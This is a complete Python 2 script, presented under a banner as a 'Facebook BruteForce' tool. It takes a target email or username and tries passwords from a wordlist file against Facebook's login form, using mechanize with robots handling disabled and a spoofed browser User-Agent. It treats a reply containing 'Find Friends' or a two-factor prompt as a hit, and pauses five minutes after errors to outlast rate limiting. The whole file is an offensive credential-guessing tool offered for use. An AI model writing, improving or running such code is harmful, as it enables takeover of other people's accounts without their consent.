import time
import sys

if sys.version_info[0] !=2: 
	print('''--------------------------------------
	REQUIRED PYTHON 2.x
	use: python fb2.py
--------------------------------------
			''')
	sys.exit()

post_url='https://www.facebook.com/login.php'
headers = {
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}

try:
	import mechanize
	import urllib2
	browser = mechanize.Browser()
	browser.addheaders = [('User-Agent',headers['User-Agent'])]
	browser.set_handle_robots(False)
except:
	print('\n\tPlease install mechanize.\n')
	sys.exit()

print("\n     \x1b\033[38;5;198m  █████▒▄▄▄▄       \x1b[38;5;208m▄▄▄▄    ██▀███   \033[1;92m█    ██ \033[33;1m▄▄▄█████▓▓█████ \n     \x1b\033[38;5;198m▓██   ▒▓█████▄    \x1b[38;5;208m▓█████▄ ▓██ ▒ ██▒ \033[1;92m██  ▓██▒▓  \033[33;1m██▒ ▓▒▓█   ▀ \n     \x1b\033[38;5;198m▒████ ░▒██▒ ▄██   \x1b[38;5;208m▒██▒ ▄██▓██ ░▄█ \033[1;92m▒▓██  ▒██░▒ \033[33;1m▓██░ ▒░▒███   \n     \x1b\033[38;5;198m░▓█▒  ░▒██░█▀     \x1b[38;5;208m▒██░█▀  ▒██▀▀█▄  \033[1;92m▓▓█  ░██░░ \033[33;1m▓██▓ ░ ▒▓█  ▄ \n     \x1b\033[38;5;198m░▒█░   ░▓█  ▀█▓   \x1b[38;5;208m░▓█  ▀█▓░██▓ ▒██▒\033[1;92m▒▒█████▓   \033[33;1m▒██▒ ░ ░▒████▒\n     \x1b\033[38;5;198m ▒ ░   ░▒▓███▀▒   \x1b[38;5;208m░▒▓███▀▒░ ▒▓ ░▒▓░\033[1;92m░▒▓▒ ▒ ▒   \033[33;1m▒ ░░   ░░ ▒░ ░\n     \x1b\033[38;5;198m ░     ▒░▒   ░    \x1b[38;5;208m▒░▒   ░   ░▒ ░ ▒░░░\033[1;92m▒░ ░ ░     \033[33;1m░     ░ ░  ░\n     \x1b\033[38;5;198m ░ ░    ░    ░     \x1b[38;5;208m░    ░   ░░   ░  ░░\033[1;92m░ ░ ░   ░  \033[33;1m       ░   \n     \x1b\033[38;5;198m        ░          \x1b[38;5;208m░         ░        ░\033[1;92m            \033[33;1m     ░  ░\n     \x1b\033[38;5;198m             ░          \x1b[38;5;208m░   ")
print('\n\t\033[38;5;196m---------- \033[1;32mWelcome To Facebook BruteForce \033[38;5;196m----------\n')
file=open('Hacker Rabbi0.txt','r')

email=str(raw_input('Enter Email/Username : ').strip())

print ("\nTarget Email ID : ",email)
print "\nTrying Passwords from list ..."

i=0
while file:
	passw=file.readline().strip()
	i+=1
	if len(passw) < 6:
		continue
	print str(i) +" : ",passw
	response = browser.open(post_url)
	try:
		if response.code == 200:
			browser.select_form(nr=0)
			browser.form['email'] = email
			browser.form['pass'] = passw
			response = browser.submit()
			response_data = response.read()
			if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
				print('Your password is : ',passw)
				break
	except:
		print('\nSleeping for time : 5 min\n')
		time.sleep(300)
